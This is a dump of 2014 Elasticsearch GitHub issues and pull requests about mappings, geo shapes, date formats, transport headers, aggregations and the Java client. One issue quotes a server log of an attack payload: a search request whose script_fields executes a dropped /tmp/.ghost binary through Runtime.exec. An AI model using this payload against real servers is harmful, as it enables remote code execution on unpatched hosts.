http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="clintongormley" created="2014-08-18T10:43:05Z" id="52476528">CLA not signed. Treating as bug report.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Object Mapping: Understanding Paths when Searching</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7191</link><project id="" key="" /><description>Hey there! :)

I'm having a hard time to understand why the following script returns a hit.
https://gist.github.com/lumannnn/4b1ff2b86aec9b937f89

The script creates a new index with given mapping, indexes an object (`{"a": {"b": "content"}}`), refreshes the index, and issues a match query searching for `"b": "content"`.

My assumption/understanding so far:
- If I search for `"a.b": "content"`, ES will return a hit
- If I search for `"b": "content"`, ES will not return a hit.

But the script contradicts my understanding as ES returns a result in both cases.

If one carefully examines the used mapping, he/she will notice the `"path": "full"`. I'm fully aware that this has been deprecated and refers to `copy_to`. But I'm not seeing how this would help me in this situation and so far I haven't come across a solution to my problem (documentation, Google Search, etc.).

Conclusion: Why does it return a result? What do I need to change in order to only get a result when the full path is specified? 

Tested with ES 1.2.2 (which we currently use in production) and ES 1.3.1. One node setup. Default configuration. (OS X 10.9.2, Java 1.7.0_60)
</description><key id="39740313">7191</key><summary>Object Mapping: Understanding Paths when Searching</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">lumannnn</reporter><labels /><created>2014-08-07T15:59:39Z</created><updated>2014-08-07T18:37:45Z</updated><resolved>2014-08-07T18:04:29Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-07T18:04:29Z" id="51508899">Hi @lumannnn 

This github issues list is for bug reports and feature requests. Please use the forum for questions like this.  The answer is: you're missing a `mappings` key at the top level of your create-index request.
</comment><comment author="lumannnn" created="2014-08-07T18:37:45Z" id="51513339">Thx @clintongormley for the quick response! :)
I'll head to the forum for future requests like this.

cheers!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Better error for invalid multipolygon</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7190</link><project id="" key="" /><description>Closes #7126
</description><key id="39735444">7190</key><summary>Better error for invalid multipolygon</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Geo</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-07T15:12:44Z</created><updated>2015-06-07T19:11:21Z</updated><resolved>2014-08-12T09:31:22Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-07T15:18:58Z" id="51486445">I actually like the message in the assertion better :) How about:

```
Invalid polygon: Two edges cross the date line at the same position
```
</comment><comment author="colings86" created="2014-08-07T16:01:03Z" id="51492484">@clintongormley the problem is that the message in the assertion is not the only reason for the exception being thrown (i.e. it was always the wrong message).  For example, in this case there are not two edges crossing the date line at the same position, the problem is that the polygon representing the hole is not inside the main polygon.
</comment><comment author="clintongormley" created="2014-08-07T16:02:27Z" id="51492687">ahhh right, ok, how about "Invaild shape: Hole is not within polygon"
</comment><comment author="jpountz" created="2014-08-11T16:11:44Z" id="51801992">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Search: add `format` support for date range filter and queries</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7189</link><project id="" key="" /><description>When the date format is defined in mapping, you can not use another format when querying using range date query or filter.

For example, this won't work:

```
DELETE /test 

PUT /test/t/1
{
  "date": "2014-01-01"
}

GET /test/_search
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": "01/01/2014"
          }
        }
      }
    }
  }
}
```

It causes:

```
Caused by: org.elasticsearch.ElasticsearchParseException: failed to parse date field [01/01/2014], tried both date format [dateOptionalTime], and timestamp number
```

It could be nice if we can support at query time another date format just like we support `analyzer` at search time on String fields.

Something like:

```
GET /test/_search
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": "01/01/2014",
            "format": "dd/MM/yyyy"
          }
        }
      }
    }
  }
}
```

Same for queries.

For now, we can still support it by setting in mapping different expected formats:

```
DELETE /test 

PUT /test
{
  "mappings": {
    "t": {
      "properties": {
        "date": {
          "type": "date",
          "format": "yyyy-MM-dd||dd/MM/yyyy"
        }
      }
    }
  }
}

PUT /test/t/1
{
  "date": "2014-01-01"
}

GET /test/_search
{
  "query": {
    "filtered": {
      "filter": {
        "range": {
          "date": {
            "from": "01/01/2014"
          }
        }
      }
    }
  }
}
```
</description><key id="39730020">7189</key><summary>Search: add `format` support for date range filter and queries</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dadoonet/following{/other_user}', u'events_url': u'https://api.github.com/users/dadoonet/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dadoonet/orgs', u'url': u'https://api.github.com/users/dadoonet', u'gists_url': u'https://api.github.com/users/dadoonet/gists{/gist_id}', u'html_url': u'https://github.com/dadoonet', u'subscriptions_url': u'https://api.github.com/users/dadoonet/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/274222?v=4', u'repos_url': u'https://api.github.com/users/dadoonet/repos', u'received_events_url': u'https://api.github.com/users/dadoonet/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dadoonet/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dadoonet', u'type': u'User', u'id': 274222, u'followers_url': u'https://api.github.com/users/dadoonet/followers'}</assignee><reporter username="">dadoonet</reporter><labels><label>feature</label></labels><created>2014-08-07T14:21:40Z</created><updated>2016-03-01T08:37:41Z</updated><resolved>2014-10-06T14:30:44Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-09-22T17:14:59Z" id="56406611">@clintongormley I started implemented it. PR will be opened soonish.

One question: with the new implementation, if user specify a format (let's say `yyyy`) and give a date as an option which does not respect this format (for example `2012-01-01`), we reject the request.
I was wondering if in that case, we should try also the mapping format before rejecting the operation.

That said, if the developer asked explicitly for `yyyy` format and user enter another date format, I guess that rejecting is fine.

WDYT?
</comment><comment author="clintongormley" created="2014-09-22T17:41:20Z" id="56410345">@dadoonet No. If a format is specified at query time, that's the one that should apply.  Also, they should be able to supply multiple formats in the same way that they do in the mapping.
</comment><comment author="dadoonet" created="2014-09-22T17:42:08Z" id="56410474">Cool. That's exactly what I did :)

PR is here: #7821 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix geo_shapes which intersect dateline</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7188</link><project id="" key="" /><description>If a geo_shape had edges which either ran vertically along the dateline or touched the date line but did not cross it they would fail to parse.  This is because the code which splits a polygon along the dateline did not take into account the case where the polygon touched but did not cross the dateline.  This PR fixes those issues and provides tests for them.

Close #7016
</description><key id="39729644">7188</key><summary>Fix geo_shapes which intersect dateline</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels><label>:Geo</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-07T14:18:04Z</created><updated>2015-06-07T19:11:29Z</updated><resolved>2014-08-12T09:27:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-11T16:11:12Z" id="51801918">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Added transient header support for TransportMessage</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7187</link><project id="" key="" /><description>- Transient headers are headers that can be set on messages yet are not serialized with them.
- Changed header accessors/mutators so header manipulation will be done directly on the request (to void NPE with transport message headers when dealing with maps that can potentially be null)
- Added a randomVersionCompatibleWith(Version) method to the test infrastructure to help with bwc testing
</description><key id="39713923">7187</key><summary>Added transient header support for TransportMessage</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-07T10:53:03Z</created><updated>2015-06-07T12:28:13Z</updated><resolved>2014-08-07T15:51:37Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-07T11:30:02Z" id="51459957">I think it's ok to add the ability to add some context to messages, that can be reused during processing, but I don't think we should reuse headers for that, this should be a separate data-structure.
</comment><comment author="uboness" created="2014-08-07T11:31:18Z" id="51460053">@jpountz fair enough... we can have another construct in the request, say... `Context` to take care of transient data
</comment><comment author="jpountz" created="2014-08-07T13:51:02Z" id="51473708">@uboness Left some comments
</comment><comment author="uboness" created="2014-08-07T13:59:45Z" id="51474902">@jpountz  final pass?
</comment><comment author="uboness" created="2014-08-07T15:51:37Z" id="51491181">merged with 1f9bceb5c54dfeade0326b90b74c39fe6ffe8aae
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Remove operationThreaded setter from ExplainRequestBuilder</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7186</link><project id="" key="" /><description>It's already available in base class `SingleShardOperationRequestBuilder` and it doesn't follow the setter convention that we adopted for request builders.
Fixed also javadocs warning caused byt missing descriptions for tag.
</description><key id="39701972">7186</key><summary>Remove operationThreaded setter from ExplainRequestBuilder</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Java API</label><label>breaking</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-07T08:02:29Z</created><updated>2015-06-06T16:43:04Z</updated><resolved>2014-08-07T11:42:56Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-07T10:57:19Z" id="51457416">LGTM
</comment><comment author="javanna" created="2014-08-07T11:44:57Z" id="51461090">Side note: this change is marked as breaking as it removes a method from the Java API. Fixing compilation errors caused by this is very easy though, just replace `.operationThreaded(flag)` with `.setOperationThreaded(flag)`.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Linux virus using elasticsearch???</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7185</link><project id="" key="" /><description>This is what i have found in the logs:

```
[2014-08-06 22:23:54,252][DEBUG][action.search.type       ] [Hazard] All shards failed for phase: [query]
[2014-08-06 22:23:54,248][DEBUG][action.search.type       ] [Hazard] [production_tours_1405654806219][3], node[aDG6Y1KGQJGzfilASmTTOA], [P], s[STARTED]: Failed to execute [org.elasticsearch.action.search.SearchRequest@1983ccd] lastShard [true]
org.elasticsearch.search.SearchParseException: [production_tours_1405654806219][3]: query[ConstantScore(*:*)],from[-1],size[1]: Parse Failure [Failed to parse source [{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},"script_fields":{"exp":{"script":"import java.util.*;\nimport java.io.*;\nString str = \"\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\"nohup /tmp/.ghost\").getInputStream()));StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str \"\r\n\");}sb.toString();"}}}]]
```

What is this??? Virus that uses elasticsearch???
</description><key id="39692965">7185</key><summary>Linux virus using elasticsearch???</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">USvER</reporter><labels /><created>2014-08-07T05:35:32Z</created><updated>2014-08-07T06:11:31Z</updated><resolved>2014-08-07T06:11:31Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-07T06:11:31Z" id="51434875">Read this: http://www.elasticsearch.org/blog/scripting-security/
It's explained there.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Parse Failure [Expected [START_OBJECT] under [filter], but got a [START_ARRAY</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7184</link><project id="" key="" /><description>I've tried to upgrade the version of ES yesterday (from 1.1.1 to 1.3.1) and I have an Issue when I try to use a complexe query with Aggregation.

Parse Failure [Expected [START_OBJECT] under [filter], but got a [START_ARRAY

I've this bug since the version 1.2.0 (I've tried all the version after this version and I have this bug). 

My system is very complexe and this bug comes from a filter on a Aggregation. I don't have enough time to expose my mapping and all the needs to reproduce the bug sorry about that. For my application I'd to downgrade my version to 1.1.2 to have my project working well.

Any Suggestion ? 
</description><key id="39685117">7184</key><summary>Parse Failure [Expected [START_OBJECT] under [filter], but got a [START_ARRAY</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">vgross</reporter><labels /><created>2014-08-07T02:13:10Z</created><updated>2014-08-07T03:17:55Z</updated><resolved>2014-08-07T03:17:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-07T03:17:55Z" id="51426176">Please use mailing list for questions. We can help you there.
Note that you should provide a generated query as it will be easier to help you.

Judging from your error, you have a filter like filter: [ ] instead of filter: { }
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Can aggregation use a prepared result of real-time Map Reduce task?</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7183</link><project id="" key="" /><description>I want to know the theory of ES aggregation.
Maybe, it is one of them:
(1) like a Database. compute when the aggregation query comes.
(2) like Storm. When a data comes, it aggregate once. You don't need aggregate when query comes. The aggregation query use a prepared result. So it is very quick when query. Storm is like a real-time Hadoop.

So ES is like (1)a common Database? or (2)Storm?
Thank you!
</description><key id="39682638">7183</key><summary>Can aggregation use a prepared result of real-time Map Reduce task?</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">fireflyk</reporter><labels /><created>2014-08-07T01:16:07Z</created><updated>2014-08-07T03:58:29Z</updated><resolved>2014-08-07T02:02:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-07T02:02:01Z" id="51422155">@fireflyk we are using github issues to track bug reports and feature requests. So, could you ask this question on the [elasticsearch mailing list](https://groups.google.com/forum/?fromgroups#!forum/elasticsearch) instead? In short the answer to your question is aggregations are computed when an aggregation query comes, but because of data structures that elasticsearch is using, they can computed in very efficient manner. 
</comment><comment author="fireflyk" created="2014-08-07T03:58:29Z" id="51428584">Thank you for answering. I still want to know some basic theory about that efficient manner. 
And I think I should move the issue/post to elasticsearch google group.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Avoid NPE with transport message headers</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7182</link><project id="" key="" /><description>A small change just to make transport messages headers safer. `getHeaders()` now returns and immutable map and all header modifications should be done directly on the request via `putHeader`
</description><key id="39675542">7182</key><summary>Avoid NPE with transport message headers</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">uboness</reporter><labels /><created>2014-08-06T23:06:17Z</created><updated>2014-08-07T10:53:55Z</updated><resolved>2014-08-07T10:53:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="imotov" created="2014-08-07T00:10:38Z" id="51414836">LGTM
</comment><comment author="uboness" created="2014-08-07T10:53:49Z" id="51457136">closed in favour of https://github.com/elasticsearch/elasticsearch/pull/7187
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Check for null references that may be returned due to concurrent changes or inconsistent cluster state</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7181</link><project id="" key="" /><description /><key id="39668869">7181</key><summary>Check for null references that may be returned due to concurrent changes or inconsistent cluster state</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">martijnvg</reporter><labels><label>:Internal</label><label>enhancement</label><label>v1.3.2</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-06T21:36:58Z</created><updated>2015-06-07T12:28:27Z</updated><resolved>2014-08-11T16:35:30Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-11T07:48:56Z" id="51750677">Since in both cases that you fixed, the code iterates over `indices()` and then gets the index service, I'm wondering that it might be less error-prone to make IndicesService expose a `Map&lt;String, IndexService&gt;` (by copying the one it has internally) so that there is no need for those null checks?
</comment><comment author="martijnvg" created="2014-08-11T08:16:44Z" id="51752623">@jpountz I like that approach, I think we should make a copy and return ImmutableMap as well?
</comment><comment author="martijnvg" created="2014-08-11T11:14:42Z" id="51767709">@jpountz I updated the PR with your suggestion and add more null checks for fetching IndexService where that was missing.
</comment><comment author="jpountz" created="2014-08-11T13:07:24Z" id="51777040">This looks great, thanks @martijnvg 
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Payloads and Terms Aggregation</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7180</link><project id="" key="" /><description>Is it possible to implement payloads which can be used in Terms Aggregation (similar to what's available for `completion` suggester)?

I can see at least two use cases for that:
- Just returning additional information with the term (key) in aggregation results
- Sorting terms by a different value, such as manually assigned priority

The mapping may look like:

```
{
    "title": {
        "type": "string"
    },
    "brand" : {
        "type": "string",
        "index": "not_analyzed",
        "payloads": true
    }
}
```

Indexing may look like:

```
{
    "title": "iPhone",
    "brand": {
        "value": "Apple",
        "payload": {
            "priority": 1,
            "url": "apple.html"
        }
    }
},
{
    "title": "Galaxy S",
    "brand": {
        "value": "Samsung",
        "payload": {
            "priority": 2,
            "url": "samsung.html"
        }
    }
}
```

Then the query may look like:

```
{
    "aggs": {
        "brand": {
            "terms": {
                "field": "brand",
                "payloads": true,
                "order": {"_payload.priority": "desc"}
            }
        }
    }
}
```

And the result may look like:

```
{
    "aggregations" : {
        "tags" : {
            "buckets" : [
                {
                    "key" : "Samsung",
                    "doc_count" : 1,
                    "payload": {
                        "priority": 2,
                        "url": "samsung.html"
                    }
                },
                {
                    "key" : "Apple",
                    "doc_count" : 1,
                    "payload": {
                        "priority": 1,
                        "url": "apple.html"
                    }
                }
            ]
        }
    }
}
```

Currently, it can be implemented in userland by just encoding the payload into a (not analyzed) term (e.g. `Apple///apple.html///1`) before indexing and then decoding it from returned aggregation keys. For sorting it's a bit trickier - you need to make sure that your sorting key is placed in the beginning of the term and if you need to sort on different "payload" values, you just need to index into different fields.

Does implementing it natively sounds like a crazy idea?
</description><key id="39665091">7180</key><summary>Payloads and Terms Aggregation</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">kostiklv</reporter><labels><label>discuss</label></labels><created>2014-08-06T20:56:32Z</created><updated>2014-11-04T18:56:56Z</updated><resolved>2014-10-31T10:51:53Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-07T08:00:27Z" id="51442107">One issue that I see with assigning priorities this way is that we have nothing that would enforce that a given term always has the same priority. What should Elasticsearch do if a given brand (say 'Apple') is given different priorities in different documents? I guess it could either consider them different or try to aggregate these values by taking the min/max/avg.

For this kind of use-case, I think it would be more flexible to reuse existing parts of the infrastructure such as sub aggregations and sorting by sub aggregations. If I reuse your example, that could give something like:

``` json
DELETE test

PUT test
{
  "mappings": {
    "test": {
      "properties": {
        "title": {
          "type": "string"
        },
        "brand": {
          "type": "object",
          "properties": {
            "value": {
              "type": "string",
              "index": "not_analyzed"
            },
            "payload": {
              "type": "object",
              "properties": {
                "priority": {
                  "type": "integer"
                },
                "url": {
                  "type": "string",
                  "index": "not_analyzed"
                }
              }
            }
          }
        }
      }
    }
  }
}

POST test/test
{
  "title": "iPhone",
  "brand": {
    "value": "Apple",
    "payload": {
      "priority": 1,
      "url": "apple.html"
    }
  }
}

POST test/test
{
  "title": "Galaxy S",
  "brand": {
    "value": "Samsung",
    "payload": {
      "priority": 2,
      "url": "samsung.html"
    }
  }
}

GET test/_search
{
  "aggs": {
    "top_brands": {
      "terms": {
        "field": "brand.value",
        "order": {
          "priority": "asc"
        }
      },
      "aggs": {
        "priority": {
          "avg": {
            "field": "brand.payload.priority"
          }
        },
        "url": {
          "terms": {
            "field": "brand.payload.url"
          }
        }
      }
    }
  }
}
```
</comment><comment author="jpountz" created="2014-08-07T08:28:59Z" id="51444438">This issue might help as well for this kind of use-case: https://github.com/elasticsearch/elasticsearch/pull/7164 If the brand.payload object was stored as a nested doc, there could be a `top_hits` sub-aggregation under terms that would eg. collect the brand payload with the least priority.
</comment><comment author="kostiklv" created="2014-08-07T10:49:53Z" id="51456822">@jpountz, thanks for your comments!

As for different payloads assigned to the same term - how does [delimited_payload_filter](http://www.elasticsearch.org/guide/en/elasticsearch/reference/current/analysis-delimited-payload-tokenfilter.html) handle that? BTW, where the payloads extracted by this filter can be used?
In general, there may be different strategies, e.g. update the payload based on last index or fail if the payload differs. It can theoretically be even configurable.

As for nested aggregations - yes, it's possible, but I think it's not the best approach performance-wise. I haven't benchmarked it, but I'm pretty sure that my synthetic approach (i.e. joining the payload into the term) will be much faster than using nested aggregations. And if payloads would have been implemented, the work of extracting it would be just moved from user's application into ES. 

Regarding `top_hits` - also not sure about performance, since top_hits will go after the _documents_, rather than just _term properties_ (which can be stored in field data).
</comment><comment author="clintongormley" created="2014-10-31T10:51:53Z" id="61244725">Hi @kostiklv 

The problem with this design is that payloads are per term/document, but aggregations summarise documents. It sounds like a better approach would be to allow some kind of query time lookup table for each bucket key, which could then return a single instance of arbitrary metadata per term.

We'll open another issue to discuss that.
</comment><comment author="kostiklv" created="2014-11-04T18:56:56Z" id="61693879">@clintongormley, could you please link the new issue here? Also, query-time lookup table sounds like SQL join, and indeed can provide endless possibilities if available in ES.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>ES java client issues</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7179</link><project id="" key="" /><description>I am using the ES 1.3.1 server an java client version. The client does correctly connect to ES server, but the query result do not contain the expected results:

``` java
      Node node = NodeBuilder.nodeBuilder().client(true).clusterName("genesis").node();

      Client client = node.client();

      DateHistogramBuilder aggregation = AggregationBuilders.dateHistogram("f").field("@timestamp")
            .interval(Interval.days(1));

      SearchResponse sr = 
            client
               .prepareSearch("securegate", "securegate")
               .addAggregation(aggregation)
               .setSize(0)
               .execute().actionGet();

      System.out.println(sr.toString());

      String json = "{\"aggs\":{\"articles_over_time\":{\"date_histogram\":{\"field\":\"@timestamp\",\"interval\":\"1d\"}}},\"size\":0}";
      sr = client.prepareSearch("securegate").setSource(json.getBytes("utf8")).execute().actionGet();

      System.out.println("-----");
      System.out.println(sr.toString());
      client.close();

      node.close();
```

WIll produce the following output:

``` js
{
  "took" : 16,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 26,
    "max_score" : 0.0,
    "hits" : [ ]
  },
  "aggregations" : {
    "f" : {
      "buckets" : [ ]
    }
  }
}
```

``` js
{
  "took" : 2,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 26,
    "max_score" : 0.0,
    "hits" : [ ]
  },
  "aggregations" : {
    "articles_over_time" : {
      "buckets" : [ ]
    }
  }
}
```

The pretty printed json message is:

``` js
{
    "aggs": {
        "articles_over_time": {
            "date_histogram": {
                "field": "@timestamp",
                "interval": "1d"
            }
        }
    },
    "size": 0
}
```

Using the REST api with POST to localhost:9200/_search will produce a different output:

``` js
{
"took" : 98,
"timed_out" : false,
"_shards" : {
"total" : 25,
"successful" : 25,
"failed" : 0
},
"hits" : {
"total" : 6609748,
"max_score" : 0,
"hits" : [
]
},
"aggregations" : {
"articles_over_time" : {
"buckets" : [
{
"key_as_string" : "2014-01-07T00:00:00.000Z",
"key" : 1389052800000,
"doc_count" : 2
},
{
"key_as_string" : "2014-01-08T00:00:00.000Z",
"key" : 1389139200000,
"doc_count" : 8
}, 
```
</description><key id="39657689">7179</key><summary>ES java client issues</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">skippi1</reporter><labels /><created>2014-08-06T19:41:35Z</created><updated>2014-08-07T12:39:15Z</updated><resolved>2014-08-06T20:09:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="dadoonet" created="2014-08-06T20:09:21Z" id="51389820">We can probably help you on the mailing list. I don't think it's an issue here.

When posting on the mailing list, could you also copy the exact curl command which works as expected?

A first look at your case, it sounds like that in one case you are searching in index `securegate` and with curl you search in all indices.
Note that `.prepareSearch("securegate", "securegate")` will search in index `securegate` not with type `securegate`.

Feel free to reopen if you think it's an issue.
</comment><comment author="skippi1" created="2014-08-06T20:26:04Z" id="51392035">Hi,

I discussed this issue on irc and I am sure, it is an issue:

1.) Both examples return the correct number of documents. That indicates the correct index was used.
2.) The json query in second example produces correct result on REST api, but not in java client.
3.) Both examples do not return the correct aggregation results.

For 2.) I used the kopf plugin. With curl it should like curl -XPOST http://localhost:9200/_search ...

Probably it's an issue regarding the documentation. Some examples are not compatible with 1.3.1 of ES java api, e.g. client.prepareSearch() without parameters is not available in latest release.

see http://www.elasticsearch.org/guide/en/elasticsearch/client/java-api/current/search.html
</comment><comment author="dadoonet" created="2014-08-06T21:56:48Z" id="51403237">If I understand you correctly, you run two queries using Java which don't work as expected, but running the following works fine:

``` sh
curl -XPOST http://localhost:9200/_search -d '{
    "aggs": {
        "articles_over_time": {
            "date_histogram": {
                "field": "@timestamp",
                "interval": "1d"
            }
        }
    },
    "size": 0
}'
```

Is my understanding correct?
</comment><comment author="skippi1" created="2014-08-07T06:03:22Z" id="51434452">Hi David,

&#160;

that is correct. This query returns an result:

curl -XPOST http://localhost:9200/_search -d '{
    "aggs": {
        "articles_over_time": {
            "date_histogram": {
                "field": "@timestamp",
                "interval": "1d"
            }
        }
    },
    "size": 0
}'

But by now, when rethinking this request there's a question to myself: how does this query select an index/type? I changed the curl query to

&#160;

curl -XPOST http://localhost:9200/&lt;my-index&gt;/&lt;my-type&gt;/_search ....

This looks very similar to the java api result:

&#160;

{
&#160;&#160; "took" : 2,
&#160;&#160; "timed_out" : false,
&#160;&#160; "_shards" : {
&#160;&#160;&#160;&#160;&#160; "total" : 5,
&#160;&#160;&#160;&#160;&#160; "successful" : 5,
&#160;&#160;&#160;&#160;&#160; "failed" : 0
&#160;&#160; },
&#160;&#160; "hits" : {
&#160;&#160;&#160;&#160;&#160; "total" : 26,
